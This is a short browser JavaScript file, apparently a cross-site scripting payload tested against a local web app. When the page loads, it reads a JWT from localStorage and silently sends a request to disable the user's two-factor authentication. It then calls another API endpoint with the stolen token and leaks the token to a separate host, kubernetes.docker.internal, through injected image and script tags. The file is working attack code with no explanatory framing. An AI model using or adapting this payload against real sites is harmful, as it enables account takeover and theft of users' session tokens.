
window.addEventListener('DOMContentLoaded', (event) => {
    console.log('DOM fully loaded and parsed');
    setTimeout(makeTheCall, 3000)
});


function makeTheCall() {
  const token = window.localStorage.getItem('my_jwt')
  console.log("TOKEN", token)
  const headers = {
    method: 'PUT',
    credentials: 'include',
    Accept: "application/json",
    "Content-Type": "application/json",
    "Authorization": "Bearer " + token
  }
  console.log(headers)
  fetch('http://localhost:5001/api/user/2fa/disable', headers)
  fetch('http://localhost:5001/api/p/foo', {
    credentials: 'include',
    Accept: "application/json",
    "Content-Type": "application/json",
    "Authorization": "Bearer " + token
  })
  let img = document.createElement('img')
  img.src="http://kubernetes.docker.internal/img/"+token+".jpg"
  document.body.appendChild(img)
  let script = document.createElement('script')
  script.src="http://kubernetes.docker.internal/script/"+token+".js"
  document.body.appendChild(script)
  let ascript = document.createElement('script')
  ascript.async = true
  ascript.src="http://kubernetes.docker.internal/ascript/"+token+".js"
  document.body.appendChild(ascript)
}
